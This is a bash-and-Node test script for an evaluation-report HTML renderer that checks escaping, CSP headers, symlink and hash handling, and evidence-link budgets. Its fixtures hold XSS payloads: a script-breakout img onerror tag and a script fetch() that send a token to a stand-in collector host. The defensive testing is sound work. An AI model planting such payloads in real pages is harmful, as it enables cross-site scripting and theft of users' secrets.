#!/usr/bin/env bash
set -euo pipefail
export LC_ALL=C

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
RENDERER="$SCRIPT_DIR/../render-report.mjs"
NODE=${NODE:-node}
TMP_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/woostack-eval-report.XXXXXX")

cleanup() {
  cleanup_status=$?
  trap - EXIT HUP INT TERM
  rm -rf "$TMP_ROOT"
  exit "$cleanup_status"
}
trap cleanup EXIT HUP INT TERM

fail() {
  printf 'FAIL: %s\n' "$*" >&2
  exit 1
}

mkdir -p "$TMP_ROOT/evidence"
mkdir -m 700 "$TMP_ROOT/report-output"

"$NODE" --input-type=module - "$TMP_ROOT" <<'NODE'
import { createHash } from 'node:crypto';
import { symlink, writeFile } from 'node:fs/promises';
import path from 'node:path';

const root = process.argv[2];
const malicious = '</script><img src="https://collector.invalid/leak?token=TOP_SECRET" onerror="alert(1)">\u0000\u0001\u001b[31m';
const hugeBytes = Buffer.from(`RAW_EVIDENCE_SECRET ${malicious}\n${'x'.repeat(2 * 1024 * 1024)}`, 'utf8');
await writeFile(path.join(root, 'evidence', 'huge-output.txt'), hugeBytes, { flag: 'wx' });
const outsideBytes = Buffer.from('OUTSIDE_EVIDENCE_SECRET\n', 'utf8');
await writeFile(path.join(root, 'outside-evidence.txt'), outsideBytes, { flag: 'wx' });
await symlink('../outside-evidence.txt', path.join(root, 'evidence', 'symlink-output.txt'));
const hashMismatchBytes = Buffer.from('HASH_MISMATCH_EVIDENCE\n', 'utf8');
await writeFile(path.join(root, 'evidence', 'hash-mismatch.txt'), hashMismatchBytes, { flag: 'wx' });
const bytesMismatchBytes = Buffer.from('BYTES_MISMATCH_EVIDENCE\n', 'utf8');
await writeFile(path.join(root, 'evidence', 'bytes-mismatch.txt'), bytesMismatchBytes, { flag: 'wx' });
const budgetEvidenceBytes = [0x61, 0x62, 0x63]
  .map((byte) => Buffer.alloc(2 * 1024 * 1024, byte));
for (const [index, bytes] of budgetEvidenceBytes.entries()) {
  await writeFile(path.join(root, 'evidence', `budget-${index + 1}.txt`), bytes, { flag: 'wx' });
}
const overBudgetBytes = Buffer.alloc((4 * 1024 * 1024) + 1, 0x64);
await writeFile(path.join(root, 'evidence', 'over-budget.txt'), overBudgetBytes, { flag: 'wx' });
const activeHtmlBytes = Buffer.from('<!doctype html><script>fetch("https://collector.invalid/evidence")</script>', 'utf8');
await writeFile(path.join(root, 'evidence', 'active.html'), activeHtmlBytes, { flag: 'wx' });
const verifiedReceiptBytes = Buffer.from('{"status":"complete","source":"fixture"}\n', 'utf8');
const verifiedReceiptPath = 'evidence/action.behavior.escape-case.candidate.1.json';
await writeFile(path.join(root, verifiedReceiptPath), verifiedReceiptBytes, { flag: 'wx' });
const publicationFailureBytes = Buffer.from('NEW_EVIDENCE_FOR_FAILED_REPORT\n', 'utf8');
await writeFile(
  path.join(root, 'evidence', 'publication-failure.txt'),
  publicationFailureBytes,
  { flag: 'wx' },
);

const sha256 = (bytes) => `sha256:${createHash('sha256').update(bytes).digest('hex')}`;
const receipt = (name) => ({
  path: `evidence/${name}.json`,
  sha256: `sha256:${'a'.repeat(64)}`,
});
const verifiedReceipt = {
  path: verifiedReceiptPath,
  sha256: sha256(verifiedReceiptBytes),
};
const publicationFailureEvidence = {
  path: 'evidence/publication-failure.txt',
  sha256: sha256(publicationFailureBytes),
  bytes: publicationFailureBytes.length,
};
const output = {
  path: 'evidence/huge-output.txt',
  sha256: sha256(hugeBytes),
  bytes: hugeBytes.length,
};
const budgetEvidence = budgetEvidenceBytes.map((bytes, index) => ({
  path: `evidence/budget-${index + 1}.txt`,
  sha256: sha256(bytes),
}));
const overBudgetEvidence = {
  path: 'evidence/over-budget.txt',
  sha256: sha256(overBudgetBytes),
};
const activeHtmlEvidence = {
  path: 'evidence/active.html',
  sha256: sha256(activeHtmlBytes),
};
const run = (repetition, durationMs, assertions, tokenUsage = 'unavailable') => ({
  repetition,
  completionStatus: 'complete',
  receipt: verifiedReceipt,
  output,
  transcript: 'unavailable',
  durationMs,
  tokenUsage,
  selectedSkill: null,
  assertions,
});
const objectiveAssertion = {
  assertionId: 'escaped-output',
  critical: true,
  pass: false,
  observed: output,
};
const pathOnlyAssertion = {
  assertionId: 'path-only-observation',
  critical: false,
  pass: false,
  observed: { path: 'workspace/path-only<&".txt' },
};
const qualitativeAssertion = {
  assertionId: 'safe-rationale',
  critical: false,
  pass: true,
  rationale: `Untrusted rationale ${malicious}`,
  anonymizedOutputId: 'output-safe-1',
  grade: receipt('grade.escape-case.candidate.1.grader'),
  graderReceipt: receipt('action.grader.escape-case.candidate.1'),
  graderInput: receipt('input.escape-case.candidate.1.grader'),
};
const evidenceAssertion = (assertionId, grade) => ({
  assertionId,
  critical: false,
  pass: true,
  rationale: 'Evidence-link policy fixture.',
  anonymizedOutputId: assertionId,
  grade,
  graderReceipt: receipt(`action.grader.${assertionId}`),
  graderInput: receipt(`input.${assertionId}.grader`),
});
const budgetAssertions = budgetEvidence.map((identity, index) =>
  evidenceAssertion(`budget-${index + 1}`, identity));
const overBudgetAssertion = evidenceAssertion('over-budget', overBudgetEvidence);
const activeHtmlAssertion = evidenceAssertion('active-html', activeHtmlEvidence);
const metric = (mean, variance = 'unavailable') => ({ mean, variance });
const comparison = (candidate, baseline, delta) => ({ candidate, baseline, delta });
const unavailableComparison = () => comparison('unavailable', 'unavailable', 'unavailable');
const tokens = (input, outputCount) => ({ input, output: outputCount, total: input + outputCount });
const tokenMetricSet = (input, outputCount) => ({
  input: metric(input),
  output: metric(outputCount),
  total: metric(input + outputCount),
});
const unavailableOverall = {
  objectivePassRate: 'unavailable',
  criticalFailures: [],
  triggerPrecision: 'unavailable',
  triggerRecall: 'unavailable',
  durationMs: 'unavailable',
  tokenUsage: 'unavailable',
};
const base = {
  schemaVersion: 2,
  runId: '20260716T120000Z-4242',
  targetSkill: 'woostack-example',
  isolationAssurance: 'enforced',
  baseline: { kind: 'git-ref', identity: '0123456789abcdef0123456789abcdef01234567' },
  runs: 1,
};
const complete = {
  ...base,
  executionStatus: 'complete',
  cases: [{
    caseId: 'escape-case',
    kind: 'behavior',
    candidate: [run(1, 100, [
      objectiveAssertion,
      pathOnlyAssertion,
      qualitativeAssertion,
      ...budgetAssertions,
      overBudgetAssertion,
      activeHtmlAssertion,
    ], tokens(10, 5))],
    baseline: [{
      ...run(1, 125, [{ ...objectiveAssertion, pass: true }], tokens(8, 4)),
      receipt: receipt('action.behavior.escape-case.baseline.1'),
    }],
    durationMs: comparison(metric(100), metric(125), -25),
    objectivePassRate: comparison(0, 1, -1),
  }],
  overall: {
    objectivePassRate: comparison(0, 1, -1),
    criticalFailures: [{
      caseId: 'escape-case',
      assertionId: 'escaped-output',
      repetitions: { candidate: [1], baseline: [] },
    }],
    triggerPrecision: unavailableComparison(),
    triggerRecall: unavailableComparison(),
    durationMs: comparison(metric(100), metric(125), -25),
    tokenUsage: {
      candidate: tokenMetricSet(10, 5),
      baseline: tokenMetricSet(8, 4),
      delta: { input: 2, output: 1, total: 3 },
    },
  },
  evidenceErrors: [],
};
const publicationFailure = structuredClone(complete);
publicationFailure.runId = '20260716T120007Z-4242';
publicationFailure.cases[0].candidate[0].output = publicationFailureEvidence;
publicationFailure.cases[0].candidate[0].assertions[0].observed = publicationFailureEvidence;
const triggerOnly = structuredClone(complete);
triggerOnly.runId = '20260716T120003Z-4242';
triggerOnly.cases[0].kind = 'trigger';
triggerOnly.cases[0].candidate[0].selectedSkill = base.targetSkill;
triggerOnly.cases[0].baseline[0].selectedSkill = 'none';
triggerOnly.cases[0].objectivePassRate = unavailableComparison();
triggerOnly.overall.objectivePassRate = unavailableComparison();
triggerOnly.overall.triggerPrecision = comparison(1, 0.5, 0.5);
triggerOnly.overall.triggerRecall = comparison(1, 1, 0);
const qualitativeOnly = structuredClone(complete);
qualitativeOnly.runId = '20260716T120004Z-4242';
qualitativeOnly.cases[0].candidate[0].assertions = [qualitativeAssertion];
qualitativeOnly.cases[0].baseline[0].assertions = [{
  ...qualitativeAssertion,
  anonymizedOutputId: 'output-safe-baseline-1',
}];
qualitativeOnly.cases[0].objectivePassRate = comparison(
  'unavailable',
  'unavailable',
  'unavailable',
);
qualitativeOnly.overall.objectivePassRate = comparison(
  'unavailable',
  'unavailable',
  'unavailable',
);
qualitativeOnly.overall.criticalFailures = [];
const completeUnavailableTokens = structuredClone(complete);
completeUnavailableTokens.runId = '20260716T120005Z-4242';
completeUnavailableTokens.cases[0].candidate[0].tokenUsage = 'unavailable';
completeUnavailableTokens.cases[0].baseline[0].tokenUsage = 'unavailable';
completeUnavailableTokens.overall.tokenUsage = 'unavailable';
const mixed = structuredClone(complete);
mixed.runId = '20260716T120006Z-4242';
const mixedTriggerCase = structuredClone(triggerOnly.cases[0]);
mixedTriggerCase.caseId = 'trigger-case';
mixedTriggerCase.candidate[0].assertions = [];
mixedTriggerCase.baseline[0].assertions = [];
mixed.cases.push(mixedTriggerCase);
mixed.overall.triggerPrecision = structuredClone(triggerOnly.overall.triggerPrecision);
mixed.overall.triggerRecall = structuredClone(triggerOnly.overall.triggerRecall);
mixed.overall.tokenUsage = {
  candidate: tokenMetricSet(20, 10),
  baseline: tokenMetricSet(16, 8),
  delta: { input: 4, output: 2, total: 6 },
};
const blocked = {
  ...base,
  runId: '20260716T120001Z-4242',
  executionStatus: 'blocked',
  cases: [{
    caseId: 'blocked-case',
    kind: 'behavior',
    candidate: [{
      repetition: 1,
      completionStatus: 'blocked',
      receipt: null,
      assertions: [objectiveAssertion],
    }],
    baseline: [{ repetition: 1, completionStatus: 'blocked', receipt: null, assertions: [] }],
    durationMs: 'unavailable',
    objectivePassRate: 'unavailable',
  }],
  overall: {
    ...unavailableOverall,
    criticalFailures: [{
      caseId: 'blocked-case',
      assertionId: 'escaped-output',
      repetitions: { candidate: [1], baseline: [] },
    }],
  },
  evidenceErrors: [{
    code: 'missing-receipt',
    field: '/output',
    path: 'evidence/bad<receipt>.json',
    message: `Blocked evidence ${malicious}`,
  }],
};
const degraded = {
  ...base,
  runId: '20260716T120002Z-4242',
  baseline: structuredClone(base.baseline),
  executionStatus: 'degraded',
  cases: [{
    caseId: 'candidate-only',
    kind: 'behavior',
    candidate: [run(1, 'unavailable', [qualitativeAssertion])],
    baseline: [],
    durationMs: 'unavailable',
    objectivePassRate: 'unavailable',
  }],
  overall: unavailableOverall,
  evidenceErrors: [],
};
const symlinked = structuredClone(complete);
const symlinkIdentity = {
  path: 'evidence/symlink-output.txt',
  sha256: sha256(outsideBytes),
  bytes: outsideBytes.length,
};
symlinked.cases[0].candidate[0].output = symlinkIdentity;
symlinked.cases[0].candidate[0].assertions[0].observed = symlinkIdentity;
const hashMismatched = structuredClone(complete);
const hashMismatchIdentity = {
  path: 'evidence/hash-mismatch.txt',
  sha256: `sha256:${'b'.repeat(64)}`,
  bytes: hashMismatchBytes.length,
};
hashMismatched.cases[0].candidate[0].output = hashMismatchIdentity;
hashMismatched.cases[0].candidate[0].assertions[0].observed = hashMismatchIdentity;
const bytesMismatched = structuredClone(complete);
const bytesMismatchIdentity = {
  path: 'evidence/bytes-mismatch.txt',
  sha256: sha256(bytesMismatchBytes),
  bytes: bytesMismatchBytes.length + 1,
};
bytesMismatched.cases[0].candidate[0].output = bytesMismatchIdentity;
bytesMismatched.cases[0].candidate[0].assertions[0].observed = bytesMismatchIdentity;

const forged = {};
forged['negative-duration'] = structuredClone(complete);
forged['negative-duration'].cases[0].durationMs.candidate.mean = -1;
forged['negative-variance'] = structuredClone(complete);
forged['negative-variance'].overall.durationMs.candidate.variance = -0.5;
forged['out-of-range-rate'] = structuredClone(complete);
forged['out-of-range-rate'].overall.objectivePassRate.candidate = 1.1;
forged['wrong-rate-delta'] = structuredClone(complete);
forged['wrong-rate-delta'].overall.objectivePassRate.delta = 0.25;
forged['wrong-duration-delta'] = structuredClone(complete);
forged['wrong-duration-delta'].cases[0].durationMs.delta = 25;
forged['negative-token-mean'] = structuredClone(complete);
const tokenMetrics = tokenMetricSet(10, 5);
forged['negative-token-mean'].overall.tokenUsage = {
  candidate: structuredClone(tokenMetrics),
  baseline: structuredClone(tokenMetrics),
  delta: { input: 0, output: 0, total: 0 },
};
forged['negative-token-mean'].overall.tokenUsage.candidate.input.mean = -1;
forged['wrong-token-total'] = structuredClone(complete);
forged['wrong-token-total'].overall.tokenUsage = {
  candidate: structuredClone(tokenMetrics),
  baseline: structuredClone(tokenMetrics),
  delta: { input: 0, output: 0, total: 1 },
};
forged['wrong-token-total'].overall.tokenUsage.candidate.total.mean = 16;
forged['stale-case-duration'] = structuredClone(complete);
forged['stale-case-duration'].cases[0].durationMs.candidate = metric(999);
forged['stale-case-duration'].cases[0].durationMs.delta = 874;
forged['stale-overall-duration'] = structuredClone(complete);
forged['stale-overall-duration'].overall.durationMs.candidate = metric(999);
forged['stale-overall-duration'].overall.durationMs.delta = 874;
forged['stale-overall-tokens'] = structuredClone(complete);
forged['stale-overall-tokens'].overall.tokenUsage.candidate = tokenMetricSet(20, 10);
forged['stale-overall-tokens'].overall.tokenUsage.delta = {
  input: 12,
  output: 6,
  total: 18,
};
forged['complete-pending-grade'] = structuredClone(complete);
const pendingGrade = forged['complete-pending-grade'].cases[0].candidate[0].assertions
  .find((assertion) => assertion.assertionId === 'safe-rationale');
pendingGrade.pass = null;
pendingGrade.grade = null;
pendingGrade.graderReceipt = null;
delete pendingGrade.graderInput;
forged['complete-unavailable'] = structuredClone(complete);
forged['complete-unavailable'].cases[0].durationMs = 'unavailable';
forged['behavior-with-trigger-metrics'] = structuredClone(complete);
forged['behavior-with-trigger-metrics'].overall.triggerPrecision = comparison(1, 0.5, 0.5);
forged['trigger-with-objective-metrics'] = structuredClone(triggerOnly);
forged['trigger-with-objective-metrics'].overall.objectivePassRate = comparison(0.5, 0.5, 0);
forged['behavior-trigger-unavailable-string'] = structuredClone(complete);
forged['behavior-trigger-unavailable-string'].overall.triggerPrecision = 'unavailable';
forged['trigger-objective-unavailable-string'] = structuredClone(triggerOnly);
forged['trigger-objective-unavailable-string'].overall.objectivePassRate = 'unavailable';
const completeNoSkill = structuredClone(complete);
completeNoSkill.baseline = {
  kind: 'none',
  identity: '0123456789abcdef0123456789abcdef01234567:absent',
};
const advisory = structuredClone(complete);
advisory.runId = '20260716T120005Z-4242';
advisory.isolationAssurance = 'advisory';
forged['degraded-missing-qualitative-proof'] = structuredClone(degraded);
forged['degraded-missing-qualitative-proof'].cases[0].candidate[0].assertions = [];
forged['degraded-action-duration'] = structuredClone(degraded);
forged['degraded-action-duration'].cases[0].candidate[0].durationMs = 100;
forged['degraded-action-tokens'] = structuredClone(degraded);
forged['degraded-action-tokens'].cases[0].candidate[0].tokenUsage = tokens(10, 5);
forged['degraded-paired'] = structuredClone(degraded);
forged['degraded-paired'].cases[0].baseline = [structuredClone(complete.cases[0].baseline[0])];
forged['blocked-comparable'] = structuredClone(blocked);
forged['blocked-comparable'].overall.objectivePassRate = comparison(0.5, 0.5, 0);
forged['stale-case-rate'] = structuredClone(complete);
forged['stale-case-rate'].cases[0].objectivePassRate = comparison(0.5, 1, -0.5);
forged['stale-overall-rate'] = structuredClone(complete);
forged['stale-overall-rate'].overall.objectivePassRate = comparison(0.5, 1, -0.5);
forged['stale-critical-failures'] = structuredClone(complete);
forged['stale-critical-failures'].overall.criticalFailures[0].assertionId = 'wrong-assertion';
forged['behavior-selected-skill'] = structuredClone(complete);
forged['behavior-selected-skill'].cases[0].candidate[0].selectedSkill = 'forged-skill';
forged['trigger-missing-selected-skill'] = structuredClone(triggerOnly);
forged['trigger-missing-selected-skill'].cases[0].candidate[0].selectedSkill = null;
forged['trigger-invalid-selected-skill'] = structuredClone(triggerOnly);
forged['trigger-invalid-selected-skill'].cases[0].candidate[0].selectedSkill = 'Not Kebab';
forged['invalid-isolation-assurance'] = structuredClone(complete);
forged['invalid-isolation-assurance'].isolationAssurance = 'best-effort';
forged['stale-aggregate-schema'] = structuredClone(complete);
forged['stale-aggregate-schema'].schemaVersion = 1;


for (const [name, value] of Object.entries({
  complete,
  completeNoSkill,
  advisory,
  publicationFailure,
  triggerOnly,
  qualitativeOnly,
  completeUnavailableTokens,
  mixed,
  blocked,
  degraded,
})) {
  await writeFile(path.join(root, `${name}.json`), `${JSON.stringify(value, null, 2)}\n`, { flag: 'wx' });
}
await symlink('complete.json', path.join(root, 'aggregate-symlink.json'));
for (const [name, value] of Object.entries({ symlinked, hashMismatched, bytesMismatched })) {
  await writeFile(path.join(root, `${name}.json`), `${JSON.stringify(value, null, 2)}\n`, { flag: 'wx' });
}
for (const [name, value] of Object.entries(forged)) {
  await writeFile(path.join(root, `forged-${name}.json`), `${JSON.stringify(value)}\n`, { flag: 'wx' });
}
await writeFile(path.join(root, 'malformed.json'), '{"schemaVersion":1,\n', { flag: 'wx' });
await writeFile(path.join(root, 'invalid.json'), `${JSON.stringify({ ...complete, unexpected: malicious })}\n`, { flag: 'wx' });
const unsafe = structuredClone(complete);
unsafe.cases[0].candidate[0].output.path = 'https://collector.invalid/evidence';
await writeFile(path.join(root, 'unsafe.json'), `${JSON.stringify(unsafe)}\n`, { flag: 'wx' });
await writeFile(path.join(root, 'too-large.json'), Buffer.alloc((8 * 1024 * 1024) + 1, 0x20), { flag: 'wx' });
NODE

if [ ! -f "$RENDERER" ]; then
  fail "render-report.mjs is missing (expected Red: escaped report fixtures self-validated)"
fi

SECRET_ENV_VALUE=DO_NOT_PRINT_THIS \
  "$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/complete.json" \
  --out "$TMP_ROOT/complete.html" \
  --terminal >"$TMP_ROOT/terminal.txt" 2>"$TMP_ROOT/complete.err"
[ ! -s "$TMP_ROOT/complete.err" ] || fail "successful render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/advisory.json" \
  --out "$TMP_ROOT/advisory.html" \
  --terminal >"$TMP_ROOT/advisory.terminal" 2>"$TMP_ROOT/advisory.err"
[ ! -s "$TMP_ROOT/advisory.err" ] || fail "advisory report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/completeNoSkill.json" \
  --out "$TMP_ROOT/completeNoSkill.html" \
  >"$TMP_ROOT/completeNoSkill.stdout" 2>"$TMP_ROOT/completeNoSkill.err"
[ ! -s "$TMP_ROOT/completeNoSkill.stdout" ] || fail "no-skill render wrote stdout"
[ ! -s "$TMP_ROOT/completeNoSkill.err" ] || fail "no-skill report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/triggerOnly.json" \
  --out "$TMP_ROOT/triggerOnly.html" \
  --terminal >"$TMP_ROOT/triggerOnly.terminal" 2>"$TMP_ROOT/triggerOnly.err"
[ ! -s "$TMP_ROOT/triggerOnly.err" ] || fail "trigger-only report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/qualitativeOnly.json" \
  --out "$TMP_ROOT/qualitativeOnly.html" \
  >"$TMP_ROOT/qualitativeOnly.stdout" 2>"$TMP_ROOT/qualitativeOnly.err"
[ ! -s "$TMP_ROOT/qualitativeOnly.stdout" ] || fail "qualitative-only render wrote stdout"
[ ! -s "$TMP_ROOT/qualitativeOnly.err" ] || fail "qualitative-only report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/mixed.json" \
  --out "$TMP_ROOT/mixed.html" \
  --terminal >"$TMP_ROOT/mixed.terminal" 2>"$TMP_ROOT/mixed.err"
[ ! -s "$TMP_ROOT/mixed.err" ] || fail "mixed report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/completeUnavailableTokens.json" \
  --out "$TMP_ROOT/completeUnavailableTokens.html" \
  >"$TMP_ROOT/completeUnavailableTokens.stdout" 2>"$TMP_ROOT/completeUnavailableTokens.err"
[ ! -s "$TMP_ROOT/completeUnavailableTokens.stdout" ] || fail "unavailable-token render wrote stdout"
[ ! -s "$TMP_ROOT/completeUnavailableTokens.err" ] || fail "unavailable-token report render wrote stderr"

"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/blocked.json" \
  --out "$TMP_ROOT/blocked.html" >"$TMP_ROOT/blocked.stdout" 2>"$TMP_ROOT/blocked.err"
[ ! -s "$TMP_ROOT/blocked.stdout" ] || fail "render without --terminal wrote stdout"
[ ! -s "$TMP_ROOT/blocked.err" ] || fail "blocked report render wrote stderr"

"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/degraded.json" \
  --out "$TMP_ROOT/degraded.html" >"$TMP_ROOT/degraded.stdout" 2>"$TMP_ROOT/degraded.err"
[ ! -s "$TMP_ROOT/degraded.stdout" ] || fail "degraded render wrote stdout"
[ ! -s "$TMP_ROOT/degraded.err" ] || fail "degraded report render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/complete.json" \
  --out "$TMP_ROOT/report-output/complete.html" \
  >"$TMP_ROOT/different.stdout" 2>"$TMP_ROOT/different.err"
[ ! -s "$TMP_ROOT/different.stdout" ] || fail "different-directory render wrote stdout"
[ ! -s "$TMP_ROOT/different.err" ] || fail "different-directory render wrote stderr"

"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/symlinked.json" \
  --out "$TMP_ROOT/symlinked.html" \
  >"$TMP_ROOT/symlinked.stdout" 2>"$TMP_ROOT/symlinked.err"
[ ! -s "$TMP_ROOT/symlinked.stdout" ] || fail "symlink evidence render wrote stdout"
[ ! -s "$TMP_ROOT/symlinked.err" ] || fail "symlink evidence render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/hashMismatched.json" \
  --out "$TMP_ROOT/hashMismatched.html" \
  >"$TMP_ROOT/hashMismatched.stdout" 2>"$TMP_ROOT/hashMismatched.err"
[ ! -s "$TMP_ROOT/hashMismatched.stdout" ] || fail "hash-mismatched evidence render wrote stdout"
[ ! -s "$TMP_ROOT/hashMismatched.err" ] || fail "hash-mismatched evidence render wrote stderr"
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/bytesMismatched.json" \
  --out "$TMP_ROOT/bytesMismatched.html" \
  >"$TMP_ROOT/bytesMismatched.stdout" 2>"$TMP_ROOT/bytesMismatched.err"
[ ! -s "$TMP_ROOT/bytesMismatched.stdout" ] || fail "bytes-mismatched evidence render wrote stdout"
[ ! -s "$TMP_ROOT/bytesMismatched.err" ] || fail "bytes-mismatched evidence render wrote stderr"


"$NODE" --input-type=module - "$TMP_ROOT" <<'NODE'
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { lstat, readFile, writeFile } from 'node:fs/promises';
import path from 'node:path';

const root = process.argv[2];
const complete = await readFile(path.join(root, 'complete.html'), 'utf8');
const blocked = await readFile(path.join(root, 'blocked.html'), 'utf8');
const advisory = await readFile(path.join(root, 'advisory.html'), 'utf8');
const triggerOnly = await readFile(path.join(root, 'triggerOnly.html'), 'utf8');
const mixed = await readFile(path.join(root, 'mixed.html'), 'utf8');
const completeUnavailableTokens = await readFile(
  path.join(root, 'completeUnavailableTokens.html'),
  'utf8',
);
const degraded = await readFile(path.join(root, 'degraded.html'), 'utf8');
const terminal = await readFile(path.join(root, 'terminal.txt'));
const advisoryTerminal = await readFile(path.join(root, 'advisory.terminal'));
const triggerTerminal = await readFile(path.join(root, 'triggerOnly.terminal'));
const mixedTerminal = await readFile(path.join(root, 'mixed.terminal'));
const differentDirectory = await readFile(path.join(root, 'report-output', 'complete.html'), 'utf8');
const symlinked = await readFile(path.join(root, 'symlinked.html'), 'utf8');
const hashMismatched = await readFile(path.join(root, 'hashMismatched.html'), 'utf8');
const bytesMismatched = await readFile(path.join(root, 'bytesMismatched.html'), 'utf8');

assert.match(
  complete.slice(0, 1024),
  /^<!doctype html>\n<html lang="en">\n<head>\n<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src 'none'; font-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; manifest-src 'none'; base-uri 'none'; form-action 'none'">/,
  'a restrictive no-script/no-network CSP must be the first head element',
);
assert.doesNotMatch(complete, /<script(?:\s|>)/i);
assert.doesNotMatch(complete, /<(?:img|iframe|object|embed|link|base|form)(?:\s|>)/i);
assert.doesNotMatch(complete, /(?:src|srcset|action)\s*=\s*["'][^"']+/i);
assert.doesNotMatch(complete, /href\s*=\s*["'](?:[a-z][a-z0-9+.-]*:|\/\/)/i);
assert.doesNotMatch(complete, /<[a-z][^>]*\son[a-z]+\s*=/i);
assert.match(complete, /&lt;\/script&gt;&lt;img src=&quot;https:\/\/collector\.invalid/);
assert.match(complete, /<h1>Skill evaluation report<\/h1>/);
assert.match(complete, /<h2[^>]*>Overall metrics<\/h2>/);
assert.match(complete, /<table>/);
assert.match(complete, /<caption>/);
assert.match(complete, /<th scope="col">/);
assert.match(complete, /<th scope="row">/);
assert.match(complete, /<details>/);
assert.match(complete, /<summary>/);
assert.doesNotMatch(complete, /<summary[^>]+tabindex=/i);
assert.match(complete, /<details>\s*<summary><h3>/);
assert.match(complete, /<\/h3><\/summary>/);
const headingLevels = [...complete.matchAll(/<h([1-4])(?:\s[^>]*)?>/g)]
  .map((match) => Number(match[1]));
assert.ok(headingLevels.includes(3), 'each case must be discoverable as a level-three heading');
for (let index = 1; index < headingLevels.length; index += 1) {
  assert.ok(
    headingLevels[index] <= headingLevels[index - 1] + 1,
    `heading level skipped from h${headingLevels[index - 1]} to h${headingLevels[index]}`,
  );
}
assert.match(complete, /Execution status: <strong>Complete<\/strong>/);
assert.match(complete, /Isolation assurance: <strong>Enforced<\/strong>/);
assert.doesNotMatch(complete, /Behavior evidence only; capability isolation was not enforced/);
assert.match(advisory, /Isolation assurance: <strong>Advisory<\/strong>/);
assert.match(advisory, /Behavior evidence only; capability isolation was not enforced/);
assert.match(triggerOnly, />Equal</);
assert.match(complete, />Changed</);
assert.match(complete, /Token usage — input<\/th><td>10<\/td><td>8<\/td><td>2<\/td>/);
assert.match(complete, /Token usage — output<\/th><td>5<\/td><td>4<\/td><td>1<\/td>/);
assert.match(complete, /Token usage — total<\/th><td>15<\/td><td>12<\/td><td>3<\/td>/);
assert.match(complete, /Trigger precision<\/th><td>Unavailable<\/td><td>Unavailable<\/td><td>Unavailable<\/td>/);
assert.match(triggerOnly, /Execution status: <strong>Complete<\/strong>/);
assert.match(triggerOnly, /Objective pass rate<\/th><td>Unavailable<\/td><td>Unavailable<\/td><td>Unavailable<\/td>/);
assert.match(complete, />Not applicable<\/td>/);
assert.match(triggerOnly, />woostack-example<\/td>/);
assert.match(triggerOnly, />none<\/td>/);
assert.match(mixed, /Execution status: <strong>Complete<\/strong>/);
assert.match(mixed, /escape-case <span class="case-kind">\(behavior\)<\/span>/);
assert.match(mixed, /trigger-case <span class="case-kind">\(trigger\)<\/span>/);
assert.match(completeUnavailableTokens, /Execution status: <strong>Complete<\/strong>/);
assert.match(completeUnavailableTokens, /Token usage<\/th><td colspan="4">Token telemetry unavailable<\/td>/);
assert.match(
  completeUnavailableTokens,
  /<td><span class="status status-complete">Complete<\/span><\/td><td>Not applicable<\/td><td>100<\/td><td>Unavailable<\/td>/,
);
assert.match(
  completeUnavailableTokens,
  /<td><span class="status status-complete">Complete<\/span><\/td><td>Not applicable<\/td><td>125<\/td><td>Unavailable<\/td>/,
);
assert.match(triggerOnly, /controlled catalog selection/i);
assert.match(triggerOnly, /not host-loader proof/i);
assert.match(mixed, /controlled catalog selection/i);
assert.match(mixed, /not host-loader proof/i);
assert.doesNotMatch(complete, /controlled catalog selection|host-loader proof/i);
assert.match(complete, /href="\.woostack-report-[0-9a-f]+-[0-9a-f]+\.txt"/);
assert.doesNotMatch(complete, /href="[^"]*evidence\//);
assert.match(
  complete,
  /<span class="evidence-identity">workspace\/path-only&lt;&amp;&quot;\.txt<\/span>/,
);
assert.doesNotMatch(complete, /href="[^"]*path-only/);
assert.match(complete, /Oversized local evidence/);
assert.match(differentDirectory, /href="\.woostack-report-[0-9a-f]+-[0-9a-f]+\.txt"/);
assert.doesNotMatch(differentDirectory, /href="\.\.\/evidence\//);
assert.doesNotMatch(symlinked, /href="[^"]*symlink-output\.txt"/);
assert.match(symlinked, /Local evidence is missing or unsafe; identity only\./);
assert.match(symlinked, /evidence\/symlink-output\.txt/);
assert.doesNotMatch(symlinked, /OUTSIDE_EVIDENCE_SECRET/);
assert.doesNotMatch(hashMismatched, /href="[^"]*hash-mismatch\.txt"/);
assert.match(hashMismatched, /evidence\/hash-mismatch\.txt/);
assert.doesNotMatch(bytesMismatched, /href="[^"]*bytes-mismatch\.txt"/);
assert.match(bytesMismatched, /evidence\/bytes-mismatch\.txt/);
assert.match(
  complete,
  /<a href="[^"]+">Open local evidence<\/a><span class="evidence-identity">evidence\/budget-1\.txt/,
);
assert.match(
  complete,
  /<a href="[^"]+">Open local evidence<\/a><span class="evidence-identity">evidence\/budget-2\.txt/,
);
assert.doesNotMatch(
  complete,
  /<a href="[^"]+">Open local evidence<\/a><span class="evidence-identity">evidence\/budget-3\.txt/,
);
assert.match(complete, /evidence\/budget-3\.txt/);
assert.doesNotMatch(complete, /href="[^"]*over-budget\.txt"/);
assert.match(complete, /evidence\/over-budget\.txt/);
assert.doesNotMatch(complete, /href="[^"]*active\.html"/);
assert.match(complete, /evidence\/active\.html/);
assert.doesNotMatch(complete, /RAW_EVIDENCE_SECRET/);
assert.doesNotMatch(complete, /[\u0000-\u0009\u000b-\u001f\u007f]/);
assert.match(blocked, /Execution status: <strong>Blocked<\/strong>/);
assert.match(blocked, /Evidence errors/);
assert.match(blocked, /&lt;receipt&gt;/);
